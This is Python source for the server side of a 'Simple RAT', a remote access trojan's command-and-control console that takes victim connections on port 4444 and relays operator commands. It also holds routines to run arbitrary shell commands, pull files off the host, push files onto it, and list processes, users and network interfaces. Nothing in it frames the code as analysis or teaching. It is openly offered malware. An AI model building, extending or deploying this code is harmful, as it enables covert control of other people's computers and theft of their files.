#!/usr/bin/env python3
"""
SIMPLE RAT SERVER - MAIN SERVER (FIXED VERSION)
"""

import socket
import threading
import subprocess
import os
import json
import base64
import sys
import time
from datetime import datetime

class SimpleRATServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.connections = []
        self.active_clients = {}
        
    def log_activity(self, message):
        """Log server activity"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}"
        print(log_message)
        
        # Save to log file
        with open("server.log", "a") as f:
            f.write(log_message + "\n")

    def reliable_send(self, conn, data):
        """Send data with length prefix"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            json_data = json.dumps(data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data)
            encoded_data = base64.b64encode(json_data.encode('utf-8'))
            conn.send(len(encoded_data).to_bytes(4, 'big') + encoded_data)
            return True
        except Exception as e:
            self.log_activity(f"Send error: {e}")
            return False

    def reliable_receive(self, conn):
        """Receive data with length prefix"""
        try:
            raw_len = conn.recv(4)
            if not raw_len:
                return None
            data_len = int.from_bytes(raw_len, 'big')
            data = b''
            while len(data) < data_len:
                packet = conn.recv(data_len - len(data))
                if not packet:
                    return None
                data += packet
            
            decoded_data = base64.b64decode(data)
            return json.loads(decoded_data)
        except Exception as e:
            self.log_activity(f"Receive error: {e}")
            return None

    def execute_command(self, command):
        """Execute system command on client"""
        try:
            # Change directory command
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed directory to: {os.getcwd()}"
            
            # Get current directory
            elif command == 'pwd':
                return os.getcwd()
            
            # List files
            elif command in ['ls', 'dir']:
                if os.name == 'nt':  # Windows
                    result = subprocess.run('dir', shell=True, capture_output=True, text=True)
                else:  # Linux/Mac
                    result = subprocess.run('ls -la', shell=True, capture_output=True, text=True)
                return result.stdout if result.returncode == 0 else result.stderr
            
            # System info
            elif command == 'sysinfo':
                import platform
                info = {
                    'platform': platform.platform(),
                    'system': platform.system(),
                    'processor': platform.processor(),
                    'current_user': os.getenv('USERNAME') or os.getenv('USER'),
                    'current_dir': os.getcwd(),
                    'python_version': platform.python_version()
                }
                return json.dumps(info, indent=2)
            
            # Download file from client
            elif command.startswith('download '):
                filename = command[9:].strip()
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode('utf-8')
                    return f"FILE:{filename}:{file_data}"
                else:
                    return f"ERROR: File {filename} not found"
            
            # Upload file to client
            elif command.startswith('upload '):
                parts = command[7:].split(':', 1)
                if len(parts) == 2:
                    filename, file_data = parts
                    try:
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(file_data))
                        return f"Uploaded {filename} successfully"
                    except Exception as e:
                        return f"Upload error: {e}"
                return "Invalid upload format"
            
            # Process list
            elif command == 'ps' or command == 'tasklist':
                try:
                    import psutil
                    processes = []
                    for proc in psutil.process_iter(['pid', 'name', 'username']):
                        processes.append(proc.info)
                    
                    result = "PID\tName\tUser\n"
                    for proc in processes[:20]:  # Show first 20
                        result += f"{proc['pid']}\t{proc['name']}\t{proc['username']}\n"
                    return result
                except ImportError:
                    return "psutil not installed"
            
            # Network info
            elif command in ['ifconfig', 'ipconfig']:
                try:
                    import psutil
                    result = ""
                    for interface, addrs in psutil.net_if_addrs().items():
                        result += f"Interface: {interface}\n"
                        for addr in addrs:
                            result += f"  {addr.family.name}: {addr.address}\n"
                        result += "\n"
                    return result
                except ImportError:
                    return "psutil not installed"
            
            # Execute any other command
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                return output if output else "Command executed (no output)"
                
        except Exception as e:
            return f"Command execution error: {str(e)}"

    def handle_client(self, conn, addr):
        """Handle client connection - FIXED VERSION"""
        client_id = f"{addr[0]}:{addr[1]}"
        self.active_clients[client_id] = {
            'conn': conn,
            'addr': addr,
            'connected_at': datetime.now()
        }
        
        self.log_activity(f"New connection from {client_id}")
        
        try:
            # Send welcome message
            self.reliable_send(conn, "🤝 Connected to RAT Server! Type 'exit' to quit.")
            
            while True:
                # Send prompt to user (hanya di server, tidak dikirim ke client)
                print(f"\nRAT@{addr[0]}:{os.getcwd()}$ ", end='')
                
                # Get command from server admin (YOU)
                try:
                    command = input().strip()
                except (EOFError, KeyboardInterrupt):
                    self.log_activity("Server admin interrupted")
                    break
                
                if not command:
                    continue
                
                # Send command to client
                if not self.reliable_send(conn, command):
                    break
                
                # Handle exit command
                if command.lower() in ['exit', 'quit']:
                    self.log_activity(f"Server requested disconnect from {client_id}")
                    break
                
                self.log_activity(f"Command to {client_id}: {command}")
                
                # Receive result from client
                result = self.reliable_receive(conn)
                if not result:
                    self.log_activity(f"Client {client_id} disconnected during command")
                    break
                
                # Display result
                print(f"📨 Result: {result}")
                
        except Exception as e:
            self.log_activity(f"Client handling error {client_id}: {e}")
        finally:
            conn.close()
            if client_id in self.active_clients:
                del self.active_clients[client_id]
            self.log_activity(f"Connection closed: {client_id}")

    def list_clients(self):
        """List all connected clients"""
        if not self.active_clients:
            return "No clients connected"
        
        result = "Connected Clients:\n"
        result += "-" * 50 + "\n"
        for client_id, info in self.active_clients.items():
            connected_time = info['connected_at'].strftime("%H:%M:%S")
            result += f"ID: {client_id} | Since: {connected_time}\n"
        return result

    def start_server(self):
        """Start RAT server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((self.host, self.port))
            server.listen(5)
            self.log_activity(f"Server started on {self.host}:{self.port}")
            self.log_activity("Waiting for connections...")
            
            while True:
                conn, addr = server.accept()
                client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                client_thread.daemon = True
                client_thread.start()
                self.connections.append(conn)
                
        except Exception as e:
            self.log_activity(f"Server error: {e}")
        finally:
            server.close()
            self.log_activity("Server stopped")

if __name__ == "__main__":
    print("🐀 RAT Server Starting...")
    print("=" * 50)
    
    server = SimpleRATServer()
    
    try:
        server.start_server()
    except KeyboardInterrupt:
        print("\n[*] Server shutdown complete")